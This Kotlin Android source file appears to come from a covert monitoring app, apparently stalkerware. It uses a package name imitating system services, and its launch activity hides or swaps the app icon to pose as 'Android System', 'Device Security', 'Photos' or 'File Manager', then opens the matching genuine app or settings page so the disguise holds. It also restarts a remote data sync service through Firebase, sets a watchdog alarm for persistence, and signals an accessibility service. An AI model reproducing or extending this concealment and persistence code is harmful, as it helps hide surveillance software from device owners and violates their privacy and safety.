package com.android.services.ui.activities

import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.net.Uri
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.receiver.WatchDogAlarmReceiver
import com.android.services.util.*


class MainLaunchActivity : AppCompatActivity() {

    companion object {
        const val TAG = "MainLaunchActivity"
        const val EXTRA_HIDE_APP = "EXTRA_HIDE_APP"
        const val FILES_APP_PACKAGE_NAME = "com.google.android.apps.nbu.files"
        const val GOOGLE_PHOTOS_PACKAGE_NAME = "com.google.android.apps.photos"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        logVerbose("$TAG in -> OnCreate()")

        // Hide App Request or Not
        val hideAppRequest = intent.getBooleanExtra(EXTRA_HIDE_APP, false)
        logVerbose("$TAG hide app request is $hideAppRequest")

        // Launch the required Screen
        if (!AppUtils.isPhoneServiceActivated()) {
            logVerbose("$TAG service not activated yet, launching activation activity")
            startActivationActivity()
            return
        } else if (AppConstants.isAppHidden && !AppConstants.isAppIconChange && AppConstants.osGreaterThanEqualToTen) {
            logVerbose("$TAG App is Hidden, Hiding the app, And OS >= 10")
            FirebasePushUtils.restartRemoteDataSyncService(applicationContext, false)
            val watchDogReceiver = WatchDogAlarmReceiver()
            watchDogReceiver.setAlarm(applicationContext)
            startActivity(Intent(Settings.ACTION_SETTINGS))
            finish()
            return
        } else if (((AppConstants.isAppHidden && AppConstants.isAppIconChange) || AppConstants.isAppIconChange)) {
            FirebasePushUtils.restartRemoteDataSyncService(applicationContext, false)
            val watchDogReceiver = WatchDogAlarmReceiver()
            watchDogReceiver.setAlarm(applicationContext)
            try{
                checkAndOpenRequiredScreen()
            }catch(e:Exception){
                Toast.makeText(this,"Can't Open This App",Toast.LENGTH_SHORT).show()
            }
            finish()
            return
        } else if (AppConstants.isAppHidden) {
            logVerbose("$TAG App is already Hidden, Hiding the app")
            finish()
            return
        }

        if (hideAppRequest) {
            // Hide app request initiated
            if (AppConstants.osGreaterThanEqualToTen) {
                logVerbose("$TAG Changing app Icon for OS 10")
                AppIconUtil.changeAppIcon(applicationContext)
            } else {
                logVerbose("$TAG Hiding app icon for OS less Than 10")
                AppIconUtil.hideAppIcon(this@MainLaunchActivity)
            }
            AppConstants.isAppHidden = true
            LocalBroadcastManager.getInstance(applicationContext).sendBroadcast(
                Intent("com.android.services.accessibility.ACTION_BACK")
                    .putExtra("ACTION_TYPE", 0)
            )
            finish()
        } else {
            startAppPermissionActivity()
        }
    }

    private fun checkAndOpenRequiredScreen() {
        when (AppConstants.appChangedName) {
            "File Manager" -> {
                if (isAppAvailable(this, AppConstants.fileManagerPackageName)) {
                    openApp(this, AppConstants.fileManagerPackageName)
                } else {
                    val intent = Intent(Intent.ACTION_GET_CONTENT)
                    startActivity(intent)
                }
            }
            "Photos" -> {
                if (isAppAvailable(this, GOOGLE_PHOTOS_PACKAGE_NAME)) {
                    openApp(this, GOOGLE_PHOTOS_PACKAGE_NAME)
                } else {
                    val i = Intent(
                        Intent.ACTION_VIEW,
                        MediaStore.Images.Media.INTERNAL_CONTENT_URI
                    )
                    startActivity(i)
                }
            }
            "Android System" -> {
                Toast.makeText(this, "Can't open this app due to low memory.", Toast.LENGTH_LONG)
                    .show()
            }
            "Device Security" -> {
                startActivity(Intent(Settings.ACTION_SECURITY_SETTINGS))
            }
            "Google Analytics" -> {
                startActivity(Intent(Settings.ACTION_ADD_ACCOUNT))
            }
            "Google" -> {
                val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"))
                if (isAppAvailable(this, "com.android.chrome")) {
                    browserIntent.`package` = "com.android.chrome"
                }
                startActivity(browserIntent)
            }
            "Music" -> {
                try {
                    val intent = Intent.makeMainSelectorActivity(
                        Intent.ACTION_MAIN,
                        Intent.CATEGORY_APP_MUSIC
                    )
                    startActivity(intent)
                } catch (e: ActivityNotFoundException) {
                    val intent = Intent()
                    intent.action = Intent.ACTION_VIEW
                    intent.type = "audio/*"
                    startActivity(intent)
                }
            }
            "Files" -> {
                if (isAppAvailable(this, FILES_APP_PACKAGE_NAME)) {
                    openApp(this, FILES_APP_PACKAGE_NAME)
                } else {
                    if (isAppAvailable(this, AppConstants.fileManagerPackageName)) {
                        openApp(this, AppConstants.fileManagerPackageName)
                    } else {
                        val intent = Intent(Intent.ACTION_GET_CONTENT)
                        startActivity(intent)
                    }
                }
            }
            "Battery Care", "Health Manager" -> {
                startActivity(Intent(Intent.ACTION_POWER_USAGE_SUMMARY))
            }
        }
//        AppConstants.isAppHidden = false
//        AppConstants.isAppIconChange = false
    }

    /** Starts the Device Activation Activity **/
    private fun startActivationActivity() {
        startActivityWithData<DeviceActivationActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            )
        )
    }

    /** Starts the App Permissions Activity **/
    private fun startAppPermissionActivity() {
        startActivityWithData<ManualPermissionActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            )
        )
    }

    fun openApp(context: Context, packageName: String?) {
        val manager: PackageManager = context.getPackageManager()
        val i = manager.getLaunchIntentForPackage(packageName!!)
        //throw new ActivityNotFoundException();
        if (i != null) {
            i.addCategory(Intent.CATEGORY_LAUNCHER)
            context.startActivity(i)
        }
    }

    fun isAppAvailable(context: Context, packageName: String?): Boolean {
        return try {
            context.packageManager.getApplicationInfo(packageName!!, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    fun getFileManagerPackageNameFromDb(context: Context) {

    }
}